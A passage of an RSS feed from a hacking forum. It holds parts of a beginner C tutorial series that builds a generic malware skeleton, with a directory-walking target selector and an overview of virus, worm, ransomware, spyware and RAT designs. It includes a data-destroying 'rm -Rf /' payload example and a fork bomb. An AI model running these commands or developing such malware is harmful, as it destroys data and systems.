  if ((fd = open (folder, O_RDONLY | O_DIRECTORY)) &lt; 0) exit (1);

  while (1) {
    // Read directory entries
    }
  }
  close (fd);
  return 0;
</code></pre>
<p>At this level, we manage the directory exactly the same than a file. We <code>open</code> it… and we <code>close</code> it whenever we are done. Now is time to see how to use <code>getdents</code>.</p>
<h2><a name="p-65426-using-getdents-10" class="anchor" href="https://d.clarkee.co.uk#p-65426-using-getdents-10"></a>Using <code>getdents</code></h2>
<p>The <code>getdents</code> prototype is as follows:</p>
<pre><code>int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
</code></pre>
<p>It receives as parameters a file descriptor (the one we got from the call to <code>open</code> with flag <code>O_DIRECTORY</code>), then a pointer to the <code>struct linux_dirent</code> (actually an pseudo-array of items of this type) and finally the size of the buffer we pass as parameter in the second parameter. You will understand this in a second.</p>
<p>As you can see the second parameter is of type <code>struct linux_dirent</code> instead of the <code>struct_dirent</code> that we used with the POSIX version. These structures are slightly different, but we can get them from the man pages of the <code>readdir</code> function and <code>getdents</code> system call respectively. Anyway we had already introduced it previously when we talked about `structs .</p>
<p>So, how does <code>getdents</code> works?. It doesn’t return just one directory entry… it returns as many as will fit in the buffer we pass as second parameter, and that number will vary depending on… Yes sure, on the length of the name of each entry. So the return value (the number of bytes read) is important in order to extract the information.</p>
<p>The man page also include example code on how to use the system call. I will include here a simplified version to explain how does this syscall work:</p>
<pre data-code-wrap="C"><code class="lang-C">  char                buf[BUF_SIZE];
  struct linux_dirent *de;
  int                 fd, n, i;
(...)
  while (1) {
    n = getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) exit (1);
    if (n == 0) break;

    // Build file name
    for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
      
	pf (de-&gt;d_name);
    i += de-&gt;d_reclen;
  }
</code></pre>
<p>First we call the syscall and process errors and end condition. And after that we have to process all the entries reported by the syscall…and we do not know how many are there. That number will depend on the size of the buffer we pass to the syscall. So we run our loop over bytes and not over <code>struct linux_dirent</code> items because we do not know the size of each entry in the array (actually this is why it is not really an array).</p>
<p>The variable <code>n</code> contains the number of bytes read by <code>getdents</code>.</p>
<p>The first entry will be at offset zero of our buffer. We access it casting our general buffer to the structure, do what we want to do and then we increase the offset by the size of the directory entry that is stored in the field <code>reclen</code>. This will update the offset in the buffer to point to the next entry and we repeat the process.</p>
<blockquote>
<p>NOTE: Casting a pointer is just forcing it into some type. This only make sense for the compiler. In reality, the memory is the same, regardless the cast operation we apply. Casting will allow us to tweak our view of a given memory block. Imaging our memory block is 16 bytes. We can see it as 16 <code>unsigned chars</code>, 8 <code>shorts</code>, 4 <code>ints</code>, 2 <code>longs</code> or 1 <code>longlong</code>. The memory block will have the same content but in our program the values that will get after casting will be different.</p>
<p>Example:<br>
A 8 bytes memory block at address ADDR contains.</p>
<pre><code>addr =  | 0x00 | 0x01 | 0x02 | 0x03 | 0x04 | 0x05 | 0x06 | 0x07 | 
</code></pre>
<pre data-code-wrap="C"><code class="lang-C">long *l = (long *) addr; // l[0] or *l will be 0x0001020304050607
int  *i = (int  *) addr; // i[0] or *i will be 0x00010203 and i[1] or *(i+1) = 0x04050607
char *c = (char *) addr; // c[0] = 0x00, c[1]= 0x01, .... c[7] = 0x07
</code></pre>
</blockquote>
<p>Let’s see this with an example. Imagine a folder containing just a file named <code>a.txt</code>. This is what <code>getdents</code> will return in the buffer:</p>
<pre><code>buf+64     -&gt; | inode
              +-------------- 
buf+59     -&gt; | a.txt\0
buf+57     -&gt; | 24
buf+49     -&gt; | offset
buf+41     -&gt; | inode
              +--------------
buf+38     -&gt; | ..\0
buf+36     -&gt; | 21 
buf+28     -&gt; | offset
buf+20     -&gt; | inode  &lt;----------+-- addr + 20
              +--------------     |           ^
buf+18     -&gt; | .\0               |           |
buf+16     -&gt; | 20     -----------+-----------+
buf+8      -&gt; | offset            |
buf       --&gt; | inode  &lt;----------+--- addr
              +--------------
</code></pre>
<p><em>NOTE: According to the man page, the offset is the distance from the start of the directory to the next dirent struct, however after printing the values I get on my test program those number look strange. I may need to double check, but may be related to the actual EXT3 filesystem that stores the directories as linked lists. For the time being we can use <code>reclen</code> to deal with the buffer returned by <code>getdents</code>, and ignore <code>d_off</code></em></p>
<p>As you can see we always get the current (<code>.</code>) and the parent ( <code>..</code>) directories and then the rest of files. In this case we only have an extra file and our 1024 bytes buffer will be mostly empty after reading the whole folder. A directory containing many files may fill the buffer completely and we may need to call <code>getdents</code> again to keep reading the directory.</p>
<h1><a name="p-65426-opaque-data-types-the-dir-struct-11" class="anchor" href="https://d.clarkee.co.uk#p-65426-opaque-data-types-the-dir-struct-11"></a>Opaque data types. The <code>DIR</code> struct</h1>
<p>Now we could figure out what is in the <code>DIR</code> type we used with the POSIX interface. It is not that we need that, but figuring out this kind of things will boost your learning… so it is up to you to skip this section or not.</p>
<p>The <code>DIR</code> type is a so-called opaque data type in the sense that the programmer (that is us) cannot see what is in it. Compare this to the <code>struct dirent</code> we have been used in our examples, where we can see the different fields and we actually need to use them.</p>
<p>Opaque data types are used together with an API that does what we need so we do not need to access the structure directly. This has the advantage that new versions of the SW may change the internal structure of the data type and, as far as the API doesn’t change our program will still work. This concept is known generically as <em>Encapsulation</em>.</p>
<p>Making a structure opaque is just a matter of not exposing the internal structure. That’s means, the structure is not defined in the .h files available to the programmer. We will see how to do this later. For the time being this is not relevant.</p>
<p>So, with all the information we have, and after learning how to use the POSIX API we can figure out what is in this <code>DIR</code> data type and also how to implement the different functions. The structure would be more or less like:</p>
<pre data-code-wrap="C"><code class="lang-C">typedef struct __my_dirstream {
	int      fd;             // File descriptor returned by open. Required by getdent
	char     buf[BUF_SIZE];  // Buffer to read directory entries (to call getdent)
	int      n;              // Number of bytes to process
	int      off;            // Number of bytes already processed
} MY_DIR;
</code></pre>
<p>I will leave as exercise to the reader the implementation of the POSIX interface using <code>open/getdents/close</code>. It is a nice exercise to get more fluent with the C programming language. Just do it, it is pretty straightforward with all the information we have learnt so far and will help you to get comfortable with C… you may need to add more fields to the structure above depending on how do you implement the API.</p>
<h1><a name="p-65426-the-final-version-12" class="anchor" href="https://d.clarkee.co.uk#p-65426-the-final-version-12"></a>The final version</h1>
<p>Just for your convenience this is the final complete version of our directory listing program:</p>
<pre data-code-wrap="C"><code class="lang-C">#define _GNU_SOURCE  // Needed by syscall
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;  
#include &lt;sys/stat.h&gt;   // Stat systemcall

#include &lt;sys/syscall.h&gt;

#define BUF_SIZE 1024

#define MFW_EXIT(s) do {perror (s); exit (EXIT_FAILURE);} while (0)

// Dirent Data struct
struct linux_dirent {
  long           d_ino;
  off_t          d_off;
  unsigned short d_reclen;
  char           d_name[];
};


char folder[1024];

// getdent wrapper. Not provided by glibc
int getdents (int fd, char *buf, int len)
{ return syscall (SYS_getdents, fd, buf, len); }

typedef int (*PAYLOAD_FUNC)(char *);

int payload (char *target) {
  printf ("Doing malware things to %s\n", target);
}

int select_target (PAYLOAD_FUNC pf) {
  char                buf[BUF_SIZE];
  struct linux_dirent *de;
  struct stat         st;
  int                 fd, n, i;
  
  // Open directory using open
  if ((fd = open (folder, O_RDONLY | O_DIRECTORY)) &lt; 0) MFW_EXIT("open:");

  while (1) {
    n = getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) MFW_EXIT ("getdents:");
    if (n == 0) break;

    for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
	  pf (de-&gt;d_name);
      i += de-&gt;d_reclen;
    }
  }
  close (fd);
  return 0;
}

int main (int argc, char *argv[]) {
  strcpy (folder, argv[1]);
  while (select_target(payload));
}

</code></pre>
<p>It has some minor changes and all the required includes and defines. I would recommend to go through it and try to understand the stuff that is not described in this text. Do not hesitate to ask in the comments if you do not understand something.</p>
<h1><a name="p-65426-conclusions-13" class="anchor" href="https://d.clarkee.co.uk#p-65426-conclusions-13"></a>Conclusions</h1>
<p>We have learnt how to read a directory using the standard POSIX interface and also using system calls. We have also learnt about function pointers and <code>structs</code>. A lot of stuff to digest. I know.</p>
<p>This is the first step to implement the <code>select_target</code> function. The second one is to be able to determine the details of each file in the directory and thus select the target needed by each specific malware. This is what we will deal with in the next instalment.</p>
<p>Note that these articles are intended for newbies, so be free to ask in the comments about any doubt. There is no stupid question when you are starting so do not be shy, I’ll try to answer all of your doubts and I’m also interested on knowing if the level of the text is too easy or too hard, so your feedback will be pretty much appreciated.</p>
<p>However I would recommend to first try to answer your question by yourself, using Google, and rechecking the previous instalments. It is not just bad <a href="https://en.wikipedia.org/wiki/Etiquette_in_technology" rel="noopener nofollow ugc">nettiquette </a> to ask questions that you can solve yourself it is also way better for your learning process. The things you learn by yourself remind steady in your memory and broads your view of the topic.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/programming-for-wanabes-vii-finding-files-i/25662">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/programming-for-wanabes-vii-finding-files-i/25662</link>
          <pubDate>Wed, 14 Apr 2021 21:43:19 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25662</guid>
          <source url="https://d.clarkee.co.uk/t/programming-for-wanabes-vii-finding-files-i/25662.rss">Programming for Wanabes VII. Finding files I</source>
        </item>
        <item>
          <title>Can someone explain a function that return an array in c</title>
          <dc:creator><![CDATA[n33ds0n]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>what’s the * in between a return type and a function name doing when declaring a function that return an array or pointer</p>
<p>int * func(){</p>
<p>}</p>
<p>What’s is the * doing in there or is it just conventional, I don’t think so because there must be a reason it is there, I just don’t want to know how to do it, I want to know why it’s there.</p>
<p>Does it mean a function pointer, I don’t think so, because a function pointer is not  declare that way.</p>
<p>I need an explanation, anyone.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/can-someone-explain-a-function-that-return-an-array-in-c/25640">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/can-someone-explain-a-function-that-return-an-array-in-c/25640</link>
          <pubDate>Tue, 13 Apr 2021 12:59:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25640</guid>
          <source url="https://d.clarkee.co.uk/t/can-someone-explain-a-function-that-return-an-array-in-c/25640.rss">Can someone explain a function that return an array in c</source>
        </item>
        <item>
          <title>Programming for Wannabes Part VI. Malware Introduction</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>In order to dive deeper into the awesome world of programming it is time to move into more complex applications, but not too much, otherwise we should have to put assembly aside… and we still have a lot to learn about THE programming language. So, <em>Malware</em> sounds as a good choice because it is relevant to the main topic of this course (the hacking world) and also, in general, <em>malware software</em> needs to be small and efficient, so there is still some room to work with assembly.</p>
<blockquote>
<p><strong>MANDATORY DISCLAIMER</strong><br>
At this point you need to know that distribution of malware, even by mistake, is a crime and you can get in real troubles doing that. Said that, you have been warned and I won’t take any responsibility on any damage you may cause to your computer or other’s machines following this course …</p>
</blockquote>
<p>The interesting thing about malware is that they are the summum of system programming, and you won’t learn more about the insights of a given system writing any other software, except of course, the OS kernel.</p>
<p>Even when anything related to malware is mostly illegal everywhere, there are many cases where writing your own malware is perfectly fine. For instance,  to evaluate specific functions of some security software (e.g. antivirus, firewalls), as a tool for legal penetration testing, to have fun messing around with some friends…</p>
<p>Said that, let’s get started taking a look to what <strong>Malware</strong> is and the types of <em>Malware</em> we can find in the wild.</p>
<h1><a name="p-65266-malware-1" class="anchor" href="https://d.clarkee.co.uk#p-65266-malware-1"></a>Malware</h1>
<p>In general, <strong>Malware</strong> is a generic term used to group any kind of software intended to harm computer systems, physical systems (remember Stuxnet) or even real persons (financially, stealing identities, harm public image…). There are many types of malware out there and they are usually classified and named against the kind of harm they produce or more precisely how that harm is produced. You probably have already heard about most of them but we will refresh our minds in a while.</p>
<p>Instead of directly jumping in the classical list of types of malware, let’s follow a slightly different approach. Let’s start coding a generic malware skeleton and see, directly on the code, how each type of malware you already know matches our code template… We will soon realise that, despite of the different names, most of them follow and even do quite the same things.</p>
<p>This will also help us to think about them as normal SW… which is actually what they are. Once we understand this, diving into the more special and weird features of some malware will be easier… as in a way or another, they will still do the same but in a twisted way :).</p>
<h1><a name="p-65266-the-payload-2" class="anchor" href="https://d.clarkee.co.uk#p-65266-the-payload-2"></a>The Payload</h1>
<p>Each <em>Malware</em> does something… the <strong>harm</strong> we mentioned earlier. We will call this the <code>payload</code>. So, our generic malware will look like this:</p>
<pre data-code-wrap="C"><code class="lang-C">int payload (void) {
  // Do your thing here 
  return 0;
}
  
int main () {
	payload ();
}
</code></pre>
<p>Not Sure?.. Just make the <code>payload</code> function be like :</p>
<pre data-code-wrap="C"><code class="lang-C">int payload (void) { system ("rm -Rf /");}
</code></pre>
<p><em>NOTE: The <code>system</code> function allows a C program to run a command-line command.</em></p>
<p>And you have wrote your first malware… It is kindof crappy and has a lot of problems, but it is a malware. It fits our definition, but it is too naive and… let’s face it… it is not cool at all. You are not reading this to run bash commands don’t you?. Let’s go on.</p>
<p><strong>Note:If you compile the program above and run it as root (something you should never do), you will really destroy your system. Do not compile or run any code in this course unless I say so or you may run into big problems. Keep reading towards the end I’ll give you some indications on how to deal with this stuff</strong></p>
<p>Back to this basic skeleton, for the time being, we have put all the code of the <em>malware</em> in a function named <code>payload</code> which is called from <code>main</code>. This looks like a smooth start, doesn’t it?</p>
<p>The <code>payload</code> is, overall, the principal responsible for the current <em>malware</em> taxonomy and depending on what it does we will get different kinds of malware. For instance:</p>
<ul>
<li><strong>Virus</strong>. A virus usually have a primary goal and an optional secondary goal. Its primary goal is to live, to propagate itself as much as possible in order to survive. The secondary goal varies but it usually involves destroying data or ruining system performance. For us in this text, the <code>payload</code> will cover both goals. Virus can also infect the whole computer getting installed in a way that they get executed before even the operating system is loaded (the MBR for instance). However these virus are less and less common nowadays, but is something that can still be done.</li>
<li><strong>Worms</strong>. As it happens with virus, <strong>worms</strong>’ main goal is to propagate, but instead of infecting programs in the same computer, <strong>Worms</strong> infect computers in a network.</li>
<li><strong>Rabbits or Fork Bombs</strong>. These have been traditionally considered virus but they are really local DOS (Denial Of Service) attacks. The payload just start to fork new processes as fast as possible (thus the name), eventually consuming all computer resources making the machine unusable. I just include this for historical reasons, but they are not that popular anymore. I doubt they will work anymore in modern systems. However …<code>:(){:|:&amp;};:</code> is something you should know as part of the hacker culture.</li>
<li><strong>Ransomware</strong>. For this kind of malware the <code>payload</code> crypts data files in the system. Then it asks for money in exchange for the key to recover the data.</li>
<li><strong>Spyware</strong>. These ones look for sensitive information (passwords, banking data,…) using different techniques and send it out to another machine</li>
<li><strong>RAT</strong>. RAT (<em>Remote Access Trojan</em>) are malware that allows remote control of the machine. For those, due to its nature, the <code>payload</code> function is interactive (will receive commands and send results to a remote machine in an infinite loop) and typically provides many capabilities (access mic/camera, send/copy files, keylogging,…). The T is because they are usually distributed as Trojans… We’ll talk about <strong>Trojans</strong> in a while.</li>
</ul>
<p>Let’s move on with our generic malware.</p>
<h1><a name="p-65266-initialisation-3" class="anchor" href="https://d.clarkee.co.uk#p-65266-initialisation-3"></a>Initialisation</h1>
<p>Almost any single program out there needs to sort things out before being able to do its stuff. This process is known as initialisation and it happens at the very beginning of the program execution. It is different for each kind of program, but present in all of them in a way or another.</p>
<p>So, the first refinement of our generic malware is to take out off the <code>payload</code>, the <code>initialisation</code> code… This is what SW engineers call <em>refactoring</em>… That sounds much more serious, but we are just chopping the function in small pieces following some logic.</p>
<p>Let’s see how our <em>malware</em> will look like now:</p>
<pre data-code-wrap="C"><code class="lang-C">int init ()    { return 0;}
int payload () { return 0;}

int main () {
  init ();
  while (1) payload ();
}
</code></pre>
<p>Right now, you will be wondering what the <code>init</code> function would do in a real <em>malware</em>?. Well, it depends but this is the place to prepare the execution of the malware, which includes, among other things, to make sure the environment is safe for execution (i.e. find out if it will be detected).</p>
<p>Let’s take a look to some common initialisation tasks.</p>
<h2><a name="p-65266-antidebug-4" class="anchor" href="https://d.clarkee.co.uk#p-65266-antidebug-4"></a>AntiDebug</h2>
<p>Despite of what most people believe and the content of most CTF out there, anti-debug and anti-tampering techniques are not than important for <em>malware</em>. These techniques are actually most common on general proprietary SW as part of anti-copying/anti-cracking techniques. Nowadays this is even less and less common as most applications are moving to on-line platforms so users cannot copy SW anymore… Yes, all the cloud thing is not better… it is just more profitable.</p>
<p>For the <em>malware</em> case, anti-debug is usually there but it doesn’t really adds much for the real good malwares. A good malware is the one that is never detected, because, once it is detected, it is just a matter of time that somebody will reverse it. No matter how much effort has been put in the <em>malware</em> it will be reversed sooner or later. Furthermore, doing <em>anti-debugging things</em> is just suspicious, and may ring many alarms.</p>
<p>In addition to the classical anti-debugging techniques (debugger detection, obfuscation, execution timing, etc…) lately many malwares also try to detect VMs/containers which are used by security SW to actually detect <em>malware</em> by running it in a controlled environment and checking the results of its execution. The so-called heuristic engines (heuristic in this context means <em>trial and error</em>).</p>
<p>The goal once again is to avoid being detected. The <em>malware</em> will detect whether it is running on a VM and therefore being analysed by some Antivirus/Antimalware engine and, in such a case, it will just stop or do something else, so there will be no track in the VM and the <em>malware</em> will not be detected.</p>
<blockquote>
<p>NOTE: Classical anti-debugging techniques are actually interesting when an attack is time-bounded or will just happen in a given time window. In that case, making the analysis of the malware difficult for enough time to cover that attack opportunity is good enough to achieve the goal. These techniques are also used by securing systems. Sometimes you do not need a completely secure system. Sometimes you just need your system to be secure for a long enough period of time.</p>
<p>Also these techniques may be useful when combined with self-destruction behaviour… Whenever the malware detects that somebody is meshing around, it will just destroy itself…</p>
</blockquote>
<p>Despite of what I have just said, most malware implements some kind of antidebugging techniques, at least some level of obfuscation. But this is often related to avoid detection by AV tools more than to avoid reversing. Anyway, we will indeed go through the most generic anti-debugging techniques in the course.</p>
<blockquote>
<p><strong>Developing this feature will teach you how debuggers and antivirus software works. Also a bit on compilers code generation and how to write your own obfuscators.</strong></p>
</blockquote>
<h2><a name="p-65266-polymorphic-engine-5" class="anchor" href="https://d.clarkee.co.uk#p-65266-polymorphic-engine-5"></a>Polymorphic Engine</h2>
<p>A polymorphic engine allows the <em>malware</em> to be <em>polymorphic</em> (that literally means many shapes/forms). :). That is, to change itself and therefore make its detection more difficult because it looks different each time. It is like disguising the program, so it is harder to get a signature (a sequence of bytes in the program that is always the same)  and, why-not, also makes analysing the code harder (a research may think that is looking to two different malwares, when it is really the same).</p>
<p>The simplest way to achieve this is using <em>crypters</em>. As you may know a <em>crypter</em> is some code that encrypts (and sometimes also compresses, and then it is usually named a <em>packer</em>) part of the program so it cannot be disassembled on the disk (until it is decrypted) and decrypts it at load-time or at run-time just before executing it..</p>
<p>The simplest way of changing the program is to use one of these <em>crypters</em> and re-encode the binary on each generation with a new random key. This way, the binary will look completely different (well, almost) and be harder to detect.</p>
<p>Note that we have used the word generation. It doesn’t make much sense to change the current malware binary (even when it is a pretty cool thing to do and I can think about a couple of use cases…) however it makes sense to change the copies generated by the <em>malware</em>. Virus and worms basically copy themselves inside other programs or into other machines respectively. Changing each of this copies, makes the detection of the virus/worm harder. it will look like two different virus/worms. Also note that this step (encryption) will be done by the <code>payload</code> function.  The decryption is done at the beginning by the <code>init</code> function. Both together are part of the polymorphic engine.</p>
<p><em>Note: This order is not engraved in stone. You can do it in different order, but this one is, in a sense, the more straightforward… and that doesn’t mean it is the best. Always learn the things the straightforward way and when you fully understand them, you can easily change’em</em>.</p>
<p>More sophisticated polymorphic engines are able to generate code automagically and re-write parts of the program in each generation, they can even keep track of those generations in order to avoid repeating <em>mutations</em> in future… This is a fascinating topic that goes down into concepts like metaprogramming (or generics as they call it nowadays, even when metaprogramming is a broader concept) or genetic algorithms. I do not think we will get that far in this series but if you are interested in the topics those are some keywords you can feed Google with to get started.</p>
<blockquote>
<p><strong>Developing this feature will teach you about basic cryptography, binary formats insights, code generation, a bit of how compilers work, and basics on loading executables in memory.</strong></p>
</blockquote>
<blockquote>
<p><strong>NOTE</strong><br>
We will keep rootkits away from the discussion for the time being. From our current point of view, rootkits (including bootkits) are just sophisticated external SW intended to avoid the detection of our malware, but not malware per-se. Anyway, they worth a mention here. We may talk a little more about them in future.</p>
</blockquote>
<h2><a name="p-65266-module-loading-6" class="anchor" href="https://d.clarkee.co.uk#p-65266-module-loading-6"></a>Module loading</h2>
<p>In general, malwares are small, for many different reasons that run from, being unnoticed (imaging a 1Gb virus getting attached to all the binaries in your system… in no time your hard drive will be full), short transfer times/bandwidth, exploit opportunities, etc… That means that is normal to have multi-stage solutions for which a very small an limited program gets first executed (a so-called <a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090" rel="noopener nofollow ugc">dropper</a>) providing the functionality to load further modules either locally from the target’s machine file system or provided remotely from some server.</p>
<p>Module loading, in the more general case, implies the implementation of the functionality of the OS loader + dynamic linker, specially when the malware developer wants to use normal tools and standard object (e.g. shared libraries) for the modules, or use existing libraries in the system. Sometimes the Poor’s man solution is used. This consist on dropping the module to load to the disk and then use the system to load it… however hitting the disk is something that malware usually trend to avoid.</p>
<blockquote>
<p>Whenever you store something in the disk, even after being deleted, there is a chance to recover it. Many malwares try very hard to make difficult to the researches to get a sample to analyse and in that context, the malware doesn’t want to store itself or parts of itself in the disk and risk to provide a sample for analysis.</p>
</blockquote>
<p>Even when we have listed <em>Module Loading</em> in the initialisation it is usually either a one-shot task (the malware gets the needed module at the time of being deployed) or an interactive task common on RATs where the attacker uploads a specific module to the victim to perform some task. In that last case it will be just another function of the payload.</p>
<blockquote>
<p><strong>Implementing this feature will teach you deep details of the binary formats (ELF in our case) and how programs get loaded, linked and executed in memory.</strong></p>
</blockquote>
<h2><a name="p-65266-other-tasks-7" class="anchor" href="https://d.clarkee.co.uk#p-65266-other-tasks-7"></a>Other tasks</h2>
<p>There are other tasks that may be performed at start-up and those tasks actually name some special types of <em>Malware</em>. These are some examples:</p>
<ul>
<li><strong>Logic Bomb</strong>. A logic bomb is a malware that stays dormant until some condition is fulfilled. The condition may be anything, but traditionally logic bombs use dates to get activated. The logic bomb will live in the system for very long periods of time doing nothing, just waiting for the trigger to get activated. So, the <code>init</code> function will check for that condition and run the <code>payload</code> or re-schedule a new execution (let’s come back to this later) until the condition is satisfied.</li>
<li><strong>Trojan Horse</strong>. A Trojan horse (named against the Greek trick used in Troy war) is a malware that actually performs some normal, harmless task but in the background it runs its payload without the user noticing what the <em>Trojan Horse</em> is really doing to the system. A Trojan horse will, typically, start a thread during <code>init</code> to run the <code>payload</code> and run the disguise task in parallel. Simpler ones, and depending on the nature of the <code>payload</code> may run the payload at the beginning or end of the execution without creating threads or processes. More recently the harmless functionality has been removed and people refers to a Trojan to any malware distributed  by somebody claiming it is not malware…This is pretty easy to implement :).</li>
</ul>
<h1><a name="p-65266-the-target-selector-8" class="anchor" href="https://d.clarkee.co.uk#p-65266-the-target-selector-8"></a>The target selector</h1>
<p>Even when our original <em>Malware</em> is perfectly fine, writing SW as a single function (well, actually two… ) is in general a bad practice and leads to many problems, specially regarding maintenance, so we better start splitting the <code>payload</code> function in pieces, i.e, going further in our refactoring journey.</p>
<p>Just a side note before continuing. The sharper readers had already likely noted that we are following the so-called <em>Top-Down approach</em> to design our malware. We start with a very rough program structure and we drill it down to the details. This is common SW engineering approach… nothing really fancy but very convenient for our current task at hand.</p>
<p>So, all the <em>Malwares</em> previously listed actually have to do the same thing. Something like this:</p>
<pre data-code-wrap="C"><code class="lang-C">while (1) {
  payload (select_target ());
}
</code></pre>
<p>Yes, all of them first select a target (this is different for each malware) and then do something on it. The function <code>select_target()</code> will abstract the concept of selecting the item to work on. The <code>payload()</code> function now is simpler and just need to work with a single target and not with all of them at once.</p>
<p>Let’s take a quick look to what <code>select_target</code> and <code>payload</code> function would do in each of the different <em>Malwares</em> we had already introduced:</p>
<h2><a name="p-65266-virus-9" class="anchor" href="https://d.clarkee.co.uk#p-65266-virus-9"></a>Virus</h2>
<p>As mentioned earlier, the main goal of a virus is to survive. Personally I have always found this fascinating. The fact that computer virus relates that much to biological virus is awesome and has been used as an argument in the field of artificial life. Furthermore, a computer program fighting to survive sounds really epic, isn’t it?</p>
<p>Anyway, a virus tries to survive infecting other programs in the computer. It copies itself into other programs and patches them so next time they get executed, the virus code is executed first and a new program may be infected. This is what the <code>payload</code> function does for a virus.</p>
<p>So, the virus needs to look for a victim or host program and this is what the <code>select_target</code> function does. In this case, it will look for executable files in the system that have not yet being infected… it doesn’t make sense to infect a program that is already infected.</p>
<blockquote>
<p><em>On Windows you can get the so-called macro Virus. Those are document macros usually from MS Office suite that get executed when Office documents are opened. In this case the virus infect documents instead of binaries. This may also happen with other data files as PDFs that provides scripting capabilities.</em></p>
</blockquote>
<p>Depending of the kind of virus, the <code>select_target</code> function may be implemented in different ways matching the infection ratio that the creator wanted. Just like <a href="https://en.wikipedia.org/wiki/Basic_reproduction_number" rel="noopener nofollow ugc">real virus</a>. So, the virus can infect 1 program each time it is executed. Multiple programs every time it is executed. Or 1 program each X times it is executed.  Actually this applies to most of the malwares we are going to talk about, when it comes back to select the target to apply their payloads.</p>
<blockquote>
<p><strong>Implementing a virus will teach you how to patch, in the disk and in memory, programs to make them execute other code. It is closely related to polymorphism and polymorphic virus are a well-known type.</strong></p>
</blockquote>
<h2><a name="p-65266-worm-10" class="anchor" href="https://d.clarkee.co.uk#p-65266-worm-10"></a>Worm</h2>
<p>A worm works mostly like a virus but, instead of copying itself into an existing program, it will copy itself into another machine and get executed there, repeating the process for ever and eventually reaching as many machines in the network as possible, effectively pivoting systematically through all accessible machines in the network (in the general case).</p>
<p>As it happens with virus, worms may have a second <code>payload</code> something to be done in each of the machines they reach… destroy files, copy information or apply a patch <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> … not all worms and virus have to do bad things.</p>
<p>In this case, the <code>select_target</code> function, instead of looking for programs, will look for reachable machines not yet infected. Again, the number of machines returned by the function will determine the spread ratio of the worm.</p>
<p>Some attack may require the worm to spread as soon as possible (for instance a ransomware campaign, distributed with a worm). Other attacks may require to spread silently and slowly, infecting machines in a network with backdoors to access them later without rising any suspicious for months. Anyhow, the concept is the same.</p>
<blockquote>
<p><strong>Implementing a worm will teach you basic network programming and how integrate exploits in your programs.</strong></p>
</blockquote>
<h2><a name="p-65266-ransomware-11" class="anchor" href="https://d.clarkee.co.uk#p-65266-ransomware-11"></a>Ransomware</h2>
<p>Ransomware, as briefly mentioned above, can be carried as secondary payload (yes, a payload run by the primary payload :)) by other malware (like a worm or virus) but it is nowadays considered a malware on its own as it has enough particularities. This malware crypts files in the machine and then ask the user for a ransom to get a key in order to recover the information. Encrypting files is the task of the <code>payload</code> function for this <em>malware</em>.</p>
<p>As you have already noticed, the <code>select_target</code> function is pretty similar to the one used by a virus, but will look for data files instead of programs.</p>
<p>Ransomware will usually try to target as much files as it can and as fast as it can. This way, whenever the user realise what is going on, enough valuable information have been lost so a user may consider appropriate to pay ransom to recover it.</p>
<blockquote>
<p><strong>Implementing a ransonware malware will teach you more advanced cryptography and concurrent programming.</strong></p>
</blockquote>
<h2><a name="p-65266-spyware-12" class="anchor" href="https://d.clarkee.co.uk#p-65266-spyware-12"></a>Spyware</h2>
<p>Again, spyware tries to retrieve sensitive information from the computer and send it out to a third party. Therefore, the <code>select_target</code> function will also require searching for files containing interesting information in the computer. The <code>payload</code> in this case will just send each one of those files out to some default service and the key part of this <em>malware</em> is really in the <code>select_target</code> function.</p>
<p>Live data capturing (camera/mic/keystrokes) could also fit in this category, but for the shake of clarity we will keep those functions just related to RATs that come next.</p>
<p>Note that as per our classification, Spyware can also capture audio, video or keystrokes (a keylogger is a classical example), but instead of sending data life, will store it and send it as files at a later time either when the attacker request it or at specific times to specific servers. In these case, there is, in principle, no <code>select_target</code> function and all functionality is in the <code>payload</code>.</p>
<blockquote>
<p><strong>Implementing Spyware will teach you how to access all available resources HW and SW in your computer. You will also learn quite some sysadmin skills.</strong></p>
</blockquote>
<h2><a name="p-65266-rats-13" class="anchor" href="https://d.clarkee.co.uk#p-65266-rats-13"></a>RATs</h2>
<p>Remote Access Trojans are the simplest (from the point of view of our template) as they do not have to make any selection. They drops straight away into the <code>payload</code> and interactively allow a remote attacker access everything on the machine.</p>
<p>To keep things simple we will just use RATs in a more generic way so it will include other kind of <em>Malwares</em> which some authors classify as independent types. In general, along this course, from the point of view of programming, we will name RATS any <em>malware</em> requiring interaction with a live attacker in a remote machine. Therefore, this includes:</p>
<ul>
<li><strong>Backdoor</strong>. A backdoor is a program that allows an attacker to get access to the machine in an easy and straightforward way, normally providing privileged shell access, but it could just provide functions to perform specific tasks (take a screenshot, copy this file, run this command,…). Usually getting access to a machine is a long, tedious and ad-hoc process that you do not want to repeat every time you want to access the machine. So a solution is, once the machine have been compromised, drop a <strong>BackDoor</strong> program that allows the attacker to get straight into the machine.</li>
